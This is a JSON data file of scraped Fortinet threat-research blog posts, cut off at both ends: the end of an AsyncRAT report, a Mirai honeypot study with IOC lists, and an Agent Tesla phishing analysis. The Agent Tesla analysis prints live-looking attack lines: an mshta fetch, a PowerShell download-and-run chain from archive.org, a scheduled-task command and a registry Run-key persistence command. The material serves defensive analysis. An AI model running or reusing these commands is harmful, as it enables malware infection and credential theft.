VBS/Agent.AK!tr ”. The RAT loader and the final payload AsyncRAT are detected as “W32/PossibleThreat”. The FortiGuard AntiVirus service is supported by FortiGate , FortiMail, FortiClient , and FortiEDR . The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date protections are protected. FortiEDR’s real time protection detects process hollowing during execution and blocks the RAT from connecting to the C2 server. Fortinet’s Phishing Simulation Service, FortiPhish, can also be used to proactively test the susceptibility of your organization to these kinds of phishing attacks. MITRE ATT&CK T1566.002: Phishing: Spearphishing Link T1059.005: Command and Scripting Interpreter: Visual Basic T1027: Obfuscated Files T1127.001: Trusted Developer Utilities Proxy Execution: MSBuild T1218.009: Signed Binary Proxy Execution: Regsvcs T1055.012: Process Injection: Process Hollowing T1547.001: Registry Run Keys / Startup Folder T1056.001: Input Capture: Keylogging T1053.002: Scheduled Task T1041: Exfiltration Over C2 Channel T1518.001: Security Software Discovery T1497: Virtualization/Sandbox Evasion IOCs Email 34646a93538a34c871e04a368c97637d1b7d1d4507bf210afd9349a61b25b35e ef4b52c8f2c844b76534f583171d03a87cc195b0c3ae32754df0c01177792432 04e93767d16a3e6ca68e45fea23434a9c9ed363c3f0d28b9653f74bbf405ef65 VBS adf94da54bc49abc6fdb2a36523eb726f26dacd5598a0fdc64e61b8d500edad8 34914c4af84888552bd7ef74d9a691918013766719881a042723001ef96f554c c16e5de09a78886dc972d26aeb0e9fe760b855eb157c7df308fad2116b860ef7 65d3ff89602db4294fa2f585c472e566a3d72d2065e6bc4f493b02a3b08393ba 4c6f832a85fbcf17308ab923b066577de859571a2743e99bf249398e19a00fb8 0b56c16a28482cc0af81b93aff36d02610e30a8d65d7ea1ccd73f8242effbada 9dd8a6725b9c881311501b79770e4f1c9aee2c3b42f59f7694d48b67939eede5 59aafb3dd9c6cdb95ff662299e1faf3efb01d5ef8479dbbb8032b4b9cb3c3d91 a54f4ee320b21c1cfde3358a25131476127b9fb1fd5cad9fd03fa2be1f4fd0e2 9297b0db717beea397aacf15e7ef081faf3b9e430002a1c1b4e150e56fb940f9 Good.xml E7D60A25BF1D80C144919F5F112594793A12A8176F2000BD890E331234A26814 8938838db8d16708692e80d170e0d8dc1522531e5a5ab5ae878a27a147780f44 b45470aa79cc7acab448a65252c3c7ee840ce6d0e78c40ad2c6bc261a912d393 f9bc8699f18b93cdb4b076dbf6f4baf2befd8c72eb26cefc28086f02a607f2f6 .NET Loader B0DC46B5FC849DA9CC7A3FC4D8AA5EA8745D7E50869AC689BB956AAB3079EEB9 814f21f8c2befba504e592e3396be7454f93013939325cc7fbad5c38f022b395 AsyncRAT 5344E8B1EF4939A3C9F84921B284DD6E0B98B2CF524D678116BEF6E58DC4A6C3 PDB E:\\Hard Drives\\Local Disk (C)\\WIN 10 [ October Update ] FILES\\Sparta Project #Hope\\projFUD\\projFUD\\obj\\Debug\\projFUD.pdb Malicious IPs 79.134.225.18 (C2) 192.145.239.18 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-06-24",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level: Critical It has been almost five years since the source code of the notorious MIRAI IoT malware was released to the public by its author in late 2016. This event led to the emergence of numerous copycats, creating their own flavors of IoT botnet armies. Although improvements have been constantly added since then by various threat actors, the structure and goal of the campaigns have remained the same. IoT malware scans the Internet for IoT devices that use default or weak usernames and passwords. They also seek to exploit known—and sometimes even zero-day —vulnerabilities to increase their chances of gaining access. And once they do, malicious binaries are downloaded and executed that make the device part of a zombie network that could then be instructed to participate in a Distributed Denial-of-Service (DDOS) attack that could cause a service outage to an unfortunate target. Some threat actors even sell these curated botnets as a service. We have been closely monitoring the current state of the IoT botnet threat landscape through the perspective of an IoT device with the help of a honeypot system. This article describes our observations over the last few weeks. Where are These Attacks Coming From? To simulate what it would be like for a new IoT device to be connected to the internet for the first time, we set up a fresh honeypot system to capture what kinds of attacks it would receive. This honeypot was designed to be vulnerable to telnet credential brute force attacks. The statistics in this article were taken from a three-week period. On average, this honeypot system received around 200 attacks per day, ultimately recording nearly 4700 telnet connections in just three weeks. We were then able to identify nearly 4000 of those attacks and connect them to a Mirai-related malware family. Since this honeypot does not execute any of the downloaded binaries, most of the attacks keep retrying until their malware has executed in the system. By removing IP duplicates, the actual number of attack sources was obtained and is broken down in the next table. Top IoT Malware Variants Mirai variant authors use unique strings or tokens in their binaries that are used to verify whether SSH or Telnet commands were successfully executed in the device—although this could also be used by the threat actors to advertise their malware or, in some cases, simply as a placeholder for novelty messages. The figure below shows a sequence of commands that the SORA Mirai variant executes immediately after gaining access to a device. These strings have been heavily used by researchers over time to classify variants. However, there are cases where variants may use different tokens but turn out to be the same malware function-wise—and are even operated by the same threat actor. In such cases, analyzing the actual binary being downloaded into the device would greatly help further define the number of existing variants. Based on the attacks received by the honeypot, the following table shows the top 10 variants we were able to identify. The Enigmatic “Hajime” Hajime was dubbed as the successor to the first generation of Mirai. Built on the same principle and goals as of its predecessor, it tries to propagate to IOT devices by means of brute-forcing credentials using a password list of common default device passwords. However, unlike Mirai, Hajime utilizes a decentralized peer-to-peer network to issue commands to its bots. This makes it much harder to locate the Command-and-Control (C2) server for a takedown. Aside from its sophisticated bot network communication, it is also one of the most mysterious variants due to its vague intentions. Commands sent to Hajime bots are in the form of structured messages that are passed along in the peer-to-peer network. One of these commands instruct bots to download and execute binaries, internally called \"modules\". Only the spreading module has been observed being served in the wild. No attack or disruptive modules have been observed, and Hajime has never been associated with any disruption attacks. Furthermore, part of its behavior is to block access to ports that are commonly targeted by other IoT malware, thereby inadvertently (or not) somewhat protecting the infected device from further infections. Lastly, it delivers the following message to the device’s terminal: Just a white hat, securing some systems. Important messages will be signed like this! Hajime Author. Contact CLOSED Stay sharp! It was only a matter of time before some speculated that Hajime might be the work of a real vigilante. SYLVEON Coming Out of Retirement? What surprised us more was the appearance of the SYLVEON variant on the table. In mid-2019 there was a 14-year old European IoT malware author that went by the name of “Light The Sylveon” and “Light The Leafeon”. When we took quick look at the decrypted strings of one of the binaries we captured, the word “Leafeon” was found, creating speculation that this might be the author’s comeback. “Light the Sylveon” co-created the destructive SILEX IoT malware, whose goal was to render vulnerable devices inoperable by running destructive commands–very similar to BrickerBot . From the malware authors’ perspective, based on a message embedded in the malware’s binary, this was to “prevent skids to flex their skidded botnet.” Eventually, the “Light The Sylveon” author announced through a post on his twitter account that he was going to abandon the project. Unlike SILEX, however, SYLVEON is a conventional IoT malware that was clearly based on the Mirai source code with some added attacks. Interestingly enough, the group greek.Helios and a certain Thar3seller, which were a group previously associated with other IoT malware campaigns, currently claim to be the authors of this variant. The relationship between these different authors is still unclear. What we are certain about is that this variant is being actively operated, as also shown by recently updated binaries found in one of its download servers. SORA - The Surviving Member of the Wicked Family It is also interesting to see Mirai variants that were authored by the threat actor known as Wicked that we covered three years ago. These variants include Owari, Omni, Wicked, and SORA. Based on an interview at that time, the author stated he was going to focus on Owari and Omni while abandoning the other two variants, including SORA. Based on our observastions, it seems that SORA has more successfully survived than its siblings. Mirai Variant MANGA Actively Updates its List of Targeted Vulnerabilities Aside from the honeypot, we have also been monitoring Mirai variants from other sources. In particular, we have been closely monitoring the developments of the MANGA variant because it is one of the most active in terms of adding new exploit vectors to its list. In fact, just a week ago, it added several more exploits, two of which are fairly recent: OptiLink ONT1GEW GPON Remote Code Execution (formTracert function) CVE-2021-1498 (Cisco HyperFlex HX Remote Code Execution) CVE-2021-31755 (Tenda Router AC11 Remote Code Execution) Unknown 1 (Unidentified target) Sample request: Here is a list of other vulnerabilities this malware variant tries to exploit: Figure 14 List of other vulnerabilities being targeted by Manga Conclusion As the number of installed IoT devices continues to explode, especially given the current lack of security standards available to protect them, IoT will be a hotbed for malware operations for the foreseeable future, as we have demonstrated in this article. And interestingly, Mirai variants are still very active in terms of attack and development. Solutions Every artifact collected from our honeypot systems and other sources are automatically processed to ensure that our customers are protected from these attacks. That said, the following precautions are highly recommended: As credential brute-forcing is still the primary way malwares get into IoT devices, setting usernames and passwords that are difficult to guess can go a long way towards securing them. In addition, to protect against known vulnerabilities, always keep device software up to date. Fortinet customers are protected by the following: Related samples are detected by FortiGuard Antivirus Downloaded URLs and identified C2s are blocked by FortiGuard Web Filtering Service. Mentioned exploit attacks are detected using the following IPS signatures: CVE-2021-22986 - F5.iControl.REST.Interface.Remote.Command.Execution CVE-2009-4490 - Acme.thttpd.and.minihttpd.Command.Injection.Vulnerability CVE-2018-10088 - XiongMai.uc-httpd.Buffer.Overflow CVE-2020-28188 - TerraMaster.TOS.Makecvs.PHP.Unauthenticated.Command.Execution CVE-2020-25506 - D-Link.ShareCenter.Products.CGI.Code.Execution CVE-2020-29957 - D-Link.DIR.825.Buffer.Overflow CVE-2021-22502 - Micro.Focus.Operations.Bridge.Reporter.Command.Injection CVE-2021-27561/CVE-2021-27562 - Yealink.Device.Management.Platform.Command.Injection CVE-2021-22991 - F5.BIG.IP.TMM.URI.Normalization.Buffer.Overflow VisualDoor RCE - Bash.Function.Definitions.Remote.Code.Execution OptiLink ONT1GEW GPON RCE - Optilink.GPON.Router.formTracert.Remote.Command.Execution CVE-2021-1498 - Cisco.HyperFlex.HX.storfs-asup.Handling.Command.Injection IOCs MANGA Files (SHA256) 25fcefa76d1752b40b33f353332ddb48b3bae529f0af24347ffeffc5e1acd5cd 5312cb57d8c38ab349a9d67db65c66a733758cb29eb118c958ede11a98322c8a 6075c917e2b25ff2def7cdb3019e0ad725a02387c9e1e83cb6514bd410c8f928 fd2aed69644ff8edcc501945ca5e83d548c6c346d3e92c922eeb3f5da03f9b8d 626e1a247045dff09c4b6aa5de8d9b9d1d385846306a359587f42b60d4413258 68601bae31381d2205dd16df1f2aff52592f9a9aad71ea5f60f68321c6aea579 40066f30b72b4184b33e834712832879f8814ddaf56c71f33bbaacb890c350f0 51ffd3c3e1b10b629692b3b1120c777388ae73c61469bb2926d2a70a457ea14d fee1a5ceea21f14b60f0d632a2889bf3ef81f45eb783e53ada44b9b2f8e4a4a 7df6c4d3bc4f528c5928e3ef09feb532e3407f893af02c16437e669390d6a09f eb64753c578138157eeff8ba1087a94538f1337bd4c6d09ac26806cb12ff69c1 ef57d97bffb2ef7a435fe6668d0aba12196cd91ee1cd3d5446ad525995b76b8d c9845823a32b9b5ff59f76771c90e4f23c8f94e9013051797cfd4efdf43c4d4f 1a2bc7e97c73efbbbe4a7ad0f577c2b3585f1fe15a3fdb82bd79f13906d838d0 ca9965127cfdae9e2d8b228af0ab691589ac27cc5ca17a3377de2e8551b64f9f 49e5ba121c216146cdcf63ebade1853a3710fa266f8c456e3dcee0565e6bdbb1 1bb9bda36b1d2a8963e5a2687ce4645a02805ad0ccb74a0b234cdb9503fdd8e3 f19c64746eddcd33daa30df9c9f282863ad05b22e2f143382f0ab18547cd6497 ec7f7a791e7bca70b5143bbe9064124ae05cdfc13a3c7ab295b6f555eda1ed7d Download URLs http[:]//212.192.241.72/bins/dark.mpsl http[:]//212.192.241.72/bins/dark.arm5 http[:]//212.192.241.72/bins/dark.arm6 http[:]//212.192.241.72/bins/dark.arm7 http[:]//212.192.241.72/bins/dark.x86 http[:]//212.192.241.72/bins/dark.ppc http[:]//212.192.241.72/bins/dark.mips Hajime Files (SHA256) a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3 Download URLs http[:]//121.121.122.176:29641/.i http[:]//121.162.45.6:38828/.i http[:]//125.227.193.220:38674/.i http[:]//130.164.183.217:62624/.i http[:]//14.42.160.123:19634/.i http[:]//147.234.71.142:7011/.i http[:]//171.232.247.121:63812/.i http[:]//171.247.233.69:36829/.i http[:]//175.115.103.118:8450/.i http[:]//178.116.76.54:20060/.i http[:]//183.108.201.171:32745/.i http[:]//184.82.56.195:58027/.i http[:]//187.233.194.166:3181/.i http[:]//187.37.198.126:14552/.i http[:]//189.132.235.210:43064/.i http[:]//189.173.97.200:41775/.i http[:]//190.18.221.214:51789/.i http[:]//2.45.4.24:50436/.i http[:]//201.105.177.84:25768/.i http[:]//210.99.125.95:56779/.i http[:]//211.107.151.26:26593/.i Sample commands after gaining access: SYLVEON Files (SHA256) 2bdd553ad6485d11844c6cb68ae63f083c7f2ee6029f128a1521427e9a29aad5 311ac01e395d96f8017ef95dfa9ee8f00aa527e02cfcd207de371e04e5aed023 4a4b8fdbe2cff3547e6d808226d34cf6059d9160326326d3b90d851e602035d8 7edb2ff320e99a1b92c7fa51dcd485edbc15eb4d23520ee26ed0d42600a733a1 4bbf2dab9cce066bab887e0058150157f0417d6dceca64025ce2127a8eb584b0 208ae3086c769098f1a55ac6d88fb760571010c16f4a0e25c98ee0d33d4bdbbc fac943c6173cf183e53bea76d4f6b07dbb455ec3dc98dda71164267fc7e1dbb4 Download URLs http[:]//31.210.20.138/uwu/arm6 http[:]//31.210.20.138/uwu/ppc http[:]//31.210.20.138/arm6 http[:]//31.210.20.138/sh4 http[:]//45.153.203.219/uwu/arm6 http[:]//45.95.169.110/bins/m68k Sample commands after gaining access: Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-06-04",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms :      Microsoft Windows Impacted parties :         Windows Users Impact :                          Sensitive Information Collection from Victim’s Device Severity level :               Critical FortiGuard Labs recently captured a fresh phishing campaign in which a Microsoft Excel document attached to a spam email downloaded and executed several pieces of VBscript code. This malware is used to hijack bitcoin address information and deliver a new variant of Agent Tesla onto the victim’s device. Agent Tesla, first discovered in late 2014, is a known spyware focused on stealing sensitive information from a victim’s device, such as saved application credentials, keyboard inputs (keylogger), etc. We have posted a number of detailed analysis blogs for Agent Tesla campaign captured by FortiGuard Labs over the past several year. Interestingly, Agent Tesla is a commercial software that is sold online, as shown in Figure 1.1, below. On the website shown above, attackers can purchase it anonymously using the payment methods of \"Perfect Money\" or \"Bitcoin Payment\". I conducted research on this latest phishing campaign, and in this post I will share my findings on how the campaign is started, what the Macro within the attached Microsoft Excel does and how it is executed, as well as how it performs bitcoin address hijack and delivers a new variant of Agent Tesla onto the victim’s device. Analysis of the Excel File from the Phishing Email As you may have noticed in Figure 2.1, the subject has been marked with “SPAM detected by FortiMail” to notify the customer that the email is a spam. The email asks the recipient to open the attached Microsoft Excel file to view the details of a document entitled “Order Requirements and Specs.” Once the victim opens the file in Microsoft Excel program, however, a security notice warning pops up, as shown in Figure 2.2, because the Excel document contains a Macro. This is an empty Excel document, whose sheets are hidden. It also contains a password protected VBA project (Macro). I figured this out by modifying its binary data. The VBA project has a predefined method, Workbook_BeforeClose(), that is automatically called when the victim closes the document. When called, it displays two UserForms with the string “ERROR!” one by one. When the second form is closed, it executes a piece of code loaded from an OptionButton’s tag property. As you can see in Figure 2.3, it is about to execute “Shell# UserForm2.OptionButton1.Tag” (where the last \"_\" in Figure 2.3 is a kind of line-continuation character) to run the command-line command \"mshta hxxp://www[.]j[.]mp/ais1kdoaksodjasod14\", which was loaded from the property “UserForm2.OptionButton1.Tag”. “mshta.exe” file is a software component of the Microsoft HTML Application Host, a utility responsible for executing HTA (HTML Application) files in Windows OS. An HTA file is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and scripting, such as VBScript or JScript. The URL “hxxp://www[.]j[.]mp/ais1kdoaksodjasod14” is redirected to “hxxp://bit[.]ly/ais1kdoaksodjasod14” and finally, is redirected to “hxxps://p8hj[.]blogspot[.]com/p/27.html” (“27.html”). As you may have guessed, the response from “27.html” contains malicious code, VBScript code for this case, which is encoded by the escape() function. There are three segments of VBScript code in the response from “27.html”. Figure 2.4 highlights the three segments of VBScript code that will be decoded and executed within the process “mshta.exe”. In the next section, I will demonstrate what the three segments of VBScript code do. Three Segments of VBScript Code 1. Overview of the new Agent Tesla variant, the Auto-Run Group, and Task Scheduler After calling unescape() twice to the first segment of VBScript code, we finally obtain HTML content, as shown in figure 3.1. This content contains a piece of VBScript code that performs the three tasks shown below: Downloads PowerShell files to deliver the new Agent Tesla variant It calls the VBScript method MicrosoftWINdows.Run() with the following parameter. \"cmd /c start /min PowerShell -ex Bypass -nOp -w 1 ;i'E'x(iwr('hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt') -useB);i'E'x(iwr(' hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt') -useB);i'E'x(iwr(' hxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt') -useB)\" It then runs PowerShell to execute three PowerShell files downloaded from three URLs. There are two EXE files stored in two huge arrays inside each downloaded PowerShell file. The two EXE files are a loader of Agent Tesla and a new variant of Agent Tesla. Below is a segment of code extracted from “27-1.txt” as an example to explain how it loads Agent Tesla. [Reflection.Assembly]::Load($Cli555).GetType('WpfControlLibrary1.LOGO').GetMethod('Run').Invoke($null,[object[]] ('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe',$Cli444)); As you can see, it loads the loader from the array $Cli555, which has a function called “WpfControlLibrary1.LOGO.Run()” requiring two parameters. It runs a normal EXE file (“MSBuild.exe”), then deploys the new Agent Tesla variant stored in the huge array $Cli444 into it and executes. This means Agent Tesla will run within “MSBuild.exe”—which is also a way to protect Agent Tesla from being detected by the victim. I’ll explain the details of “WpfControlLibrary1.LOGO.Run()” later. The VBScript code adds numerous items into the Auto-Run group in the system registry Figure 3.2 shows a screenshot of the Auto-Run group in the system registry of an infected system. It creates a WMI (Windows Management Instrumentation) Object to add into the Auto-Run group by calling its function “SetStringValue()”. Creates a scheduled task Besides adding items into the Auto-Run group, it adds a scheduled task in “Task Scheduler” to make the entire campaign work effectively. Below is the code used to run “schtasks” to create a new scheduled task. The new task name is “WIND0WSUPLATE”. Its action is to execute command “mshta hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html” and it’s called every 80 minutes. MicrosoftWINdows.run \"schtasks /create /sc MINUTE /mo 80 /tn \\\"WIND0WSUPLATE\\\" /F /tr \\\"MsHtA\\\" \\\"hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/ 27.html\\\"\" ,0 2. Hijacking a Bitcoin address on the victim’s device After being decoded, we then obtained the second piece of VBScript code. Executing it saves a batch of PowerShell code into the system registry under the subkey \"HKCU\\Software\\nasdnasndnad\". It also adds an item to execute this PowerShell code into the Auto-Run group in the system registry, causing it to run at system startup (refer to the item “replcia” in Figure 3.2). To do so, it executes the following code. MicrosoftWINdows.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\replcia\", \"mshta vbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.Shell\"\"\"\").Run \"\"\"\"powershell ((gp HKCU:\\Software).nasdnasndnad)|IEX\"\"\"\", 0 : window.close\"\")\", EXCELX Going through the PowerShell code we can see it performs a bitcoin address hijack. It does this by continually detecting the data on the system clipboard. If it’s a valid bitcoin address, it replaces the bitcoin address with attacker’s. To do so it uses a “while” statement and a function to check if a string is a valid bitcoin address. The while statement reads the system clipboard data from time to time by calling Get-Clipboard(). It then calls the function isBitcoinAddress() to determine if the data is a valid bitcoin address. If so, it then calls Set-Clipboard() to modify the bitcoin address in the clipboard to the attacker’s, which in this case is “ 19VFGWgBkn6J3kMd8ApfCbtbNUmg8eBMvp ”.  Figure 3.3 shows the PowerShell code used to hijack a bitcoin address. Usually, people use the system clipboard to copy or paste the payee’s bitcoin address to make a payment. During this time, this bitcoin hijack will change the payee’s bitcoin address to attacker’s. The victim remains unaware that he/she paid their bitcoins to the wrong payee. 3. Killing All Microsoft Excel and Word Processes The decoded code for this segment is listed below. It runs the “taskkill” command to terminate all running Microsoft Excel and Word programs. This can force kill the Excel.exe progress executing above the mshta.exe command. <script language=\"VBScript\"> CreateObject(\"WScript.Shell\").Run \"taskkill /f /im Excel.exe\", 0 CreateObject(\"WScript.Shell\").Run \"taskkill /f /im winword.exe\", 0 window.resizeTo 0, 0 self.close </script> At this point we finished analyzing the first stage of this attack to explain what it is able to do with the three segments of VBScript. Next, I will focus on the analysis of the loader and the new Agent Tesla variant that was started by the first segment of VBScript code. Analysis of the Loader Progress of Agent Tesla As I mentioned earlier, “mshta.exe” runs three segments of VBScript code in 27.html. The first one dynamically loads a .Net EXE (“the loader”) from an array ($Cli555) and calls its function WpfControlLibrary1.LOGO.Run() to deploy the real Agent Tesla from another array onto the MSBuild.exe process. I manually extracted the loader to a local file and the Run() function is displayed in Figure 4.1 using dnSpy debugger. The Run() function obtains the full path of a target process ('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe') and the binary data of the Agent Tesla variant from the second parameter. It then calls another function, PEfX2B8Tl(), to deploy this Agent Tesla variant onto the target process. As you can see in Figure 4.1, I have simplified the function for a clearer view. It first calls the API function CreateProcess() with CreateFlag 0x4 (CREATE_SUSPENDED) to create a suspended MSBuild.exe process. It then calls a bunch of familiar API functions, such as GetThreadContext(), ReadProcessMemory(), NtUnmapViewOfSection(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). After that, Agent Tesla runs within the target process “MSBuild.exe”. To show you the entire picture of the malicious process that started from the phishing campaign, I have attached a screenshot of the Process Tree below, which shows all relevant processes involved in the campaign as well as the relationship between these processes. Agent Tesla Running Within MSBuild.exe Process to Steal Data I extracted this new Agent Tesla variant to a local file from the large array ($Cli444) for static analysis. According to Figure 5.1, below, we can see that this new variant is fully obfuscated, meaning it is able to protect its code from being easily analyzed by security researchers. The class names, function names, and variable names are meaningless, as shown in Figure 5.1 (such as “A”, “a”, “B”, “b”, “C”, “c” and so on.) For instance, the entry point function of this variant is this— “A.b.A()”. When Agent Tesla starts in MSBuild.exe, it first checks to see if there is a duplicate Agent Tesla running. If one is found, it is killed to keep only one instance running at the same time. Once every time it runs, it steals the credentials of applications (like Web Browsers, FTP clients, IM, etc.) saved on the infected device and sends the stolen data to the attacker. According to my research, it steals sensitive information from 73 different applications, which can be categorized by their features, as below: Web Browsers: \"Chrome\", \"Firefox\", \"Edge\", \"Safari\", \"SRWare Iron\", \"CoolNovo\", \"QQ Browser\", \"UC Browser\", \"Elements Browser\", \"QIP Surf\", \"Epic Privacy\", \"Amigo\", \"Coccoc\", \"Coowon\", \"Torch Browser\", \"Orbitum\", \"Yandex Browser\", \"Sputnik\", \"Chedot\", \"Vivaldi\", \"Iridium Browser\", \"360 Browser\", \"Chromium\", \"Opera Browser\", \"Sleipnir 6\", \"Liebao Browser\", \"CentBrowser\", \"Brave\", \"Cool Novo\", \"Citrio\", \"Uran\", \"7Star\", \"Kometa\", \"Comodo Dragon\",\"K-Meleon\", \"FALKON\", \"IceCat\", \"Flock\", \"WaterFox\", \"PaleMoon\", \"UCBrowser\", \"IceDragon\", \"QQBrowser\", \"SeaMonkey\", \"BlackHawk\", \"CyberFox\" Email Clients and Messenger Clients: \"Postbox\", \"Foxmail\", \"Eudora\", \"Mailbird\", \"Becky!\", \"Opera Mail\", \"Outlook\", \"Thunderbird\", \"eM Client\", \"IncrediMail\", \"Claws-mail\", \"The Bat!\", \"Pocomail\" \"Psi\", \"Trillian\" VPN, FTP Clients and Download Managers: \"DownloadManager\", \"jDownloader\", \"OpenVPN\", \"SmartFTP\", \"FTPGetter\", \"WS_FTP\", \"FileZilla\", \"CFTP\", \"FTP Navigator\", \"CoreFTP\", \"WinSCP\", \"FlashFXP\" Figure 5.2 shows the moment it has obtained sensitive data from Mozilla Firefox. This data contains user credentials (UserName and Password), the application name “Firefox”, as well as the URLs where the credentials are saved. The data will then be sent to the attacker with magic flag “PW_”. I will elaborate on how the stolen data is sent to the attacker later. It starts a thread function that is used to collect cookies files from some predefined web browsers. These collected cookies files are then compressed into a ZIP archive and sent to the attacker with the magic flag “CO_”. Figure 5.3 is an example of such a ZIP archive, containing the cookies files collected from Mozilla Firefox and Google Chrome on my test machine. In addition to what I explained above, it also collects data from the system clipboard and the victim’s inputs (the keylogger). It calls the API SetClipboardViewer() to register itself so it is able to receive notice once the clipboard data is changed. It can then obtain and save clipboard data. The attacker also enabled the keylogger feature in this variant. It sets a hook on the Windows message WH_KEYBOARD_LL (13) by calling the API function SetWindowsHookEx(), so it can receive all keyboard messages when the victim types. Both data collected from the clipboard and through victim’s inputs are saved in html format in a global variable. Agent Tesla starts a Timer (being called every 20 minutes) to check if the global variable has data, and if so, it sends its data to the attacker with the magic flag “KL_”. As shown in Figure 5.4 is an example of the data collected from victim’s inputs and the clipboard that were extracted by me when it was sent to the attacker. As you can see, this data contains basic information, including current time, User Name, Computer Name, OS version, CPU type, and memory capacity. The keylogger data contains application name (“Google Chrome”), application title (“New Tab – Google Chrome”), current time (05/21/2021 10:48:18), as well as victim’s inputs at the second line. The clipboard data starts with a constant string “Copied Text:” and clipboard data at the second line. Sending Stolen Data to the Attacker Agent Tesla supports several ways to send stolen data to its C2 server. They are over SMTP to send data to the attacker’s email address, over FTP to send the data to the attacker’s FTP server, and over HTTP POST to send the data to attacker’s HTTP server. The variant we captured uses FTP protocol’s STOR command (store) to submit the stolen sensitive data. Agent Tesla has several magic flags to identify what kind of the data is being reported. These are “PW_” for credentials, “CO_” for cookies files, “KL” for keylogger and clipboard, and “SC_” for screenshot (not enabled in this variant). The data file name consists of a magic flag, User Name, Computer Name, and current time. Figure 6.1 shows a screenshot of Wireshark displaying the data transportation process in an FTP-Data packet (with the magic flag “PW_”), where it contains stolen credentials saved in Firefox and FileZilla. Conclusion Most attackers like to spread malware in phishing emails. As a result, new phishing campaigns are detected every day by FortiGuard Labs. People should be more careful when opening files attached to email. The one I just analyzed not only used a VBScript to hijack the victim’s clipboard but also delivered a new variant of Agent Tesla. In this post I walked through this campaign, beginning with how the malicious Macro inside an attached Microsoft Excel document is executed. I then elaborated on how the three VBScript code segments found in the response from 27.html work to perform a bitcoin address hijack and to launch a new variant of Agent Tesla. Next, I demonstrated what applications this variant could steal sensitive data from, and what kind of sensitive data Agent Tesla is interested in, including saved credentials, cookies files of some web browsers, keylogger data, and clipboard data. And finally, I introduced how the stolen data is submitted to the attacker using an FTP-DATA packet. Fortinet Protections Fortinet customers are already protected from this Agent Tesla variant with FortiGuard’s Web Filtering, Anti-Spamming, and AntiVirus services, as follow: The related URLs listed in IOCs have been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The phishing email has been marked as SPAM by FortiMail. The attached Excel file is detected as “ VBA/Agent.WCN!tr ” and blocked by the FortiGuard AntiVirus service. The FortiGuard AntiVirus service is supported by FortiGate , FortiMail, FortiClient, and FortiEDR . The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date versions are protected. We also suggest our readers go through the free NSE training — NSE 1 – Information Security Awareness , which has a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. IOCs: URLs hxxp://www[.]j[.]mp/ais1kdoaksodjasod14 hxxp://bit[.]ly/ais1kdoaksodjasod14 hxxps://p8hj[.]blogspot[.]com/p/27[.]html hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt hxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html hxxp://1230948%1230948@newblogset144[.]blogspot[.]com/p/27.html hxxp://1230948%1230948@firstblognew123[.]blogspot[.]com/p/27.html hxxp://1230948%1230948@papagunnakjdnmwdnwmndwm[.]blogspot[.]com/p/27.html Sample SHA-256 [Order Requirements and Specs.xls] F10D005B7997686E87BAEE766E5B28BE3386FE3BA9A557BD2042DCBA5414B740 [Extracted new variant of Agent Tesla] 6FED3E1D302B9DF7893248367ED06F8A4F5BA2D3B7547E3F49D1D00A7718A8B4 Reference: New Agent Tesla Variant Spreading by Phishing Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/security-predictions-for-2022-tomorrows-threats-will-target-the-expanding-attack-surface": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-11-16",
                    "source": "www.fortinet.com"
                },
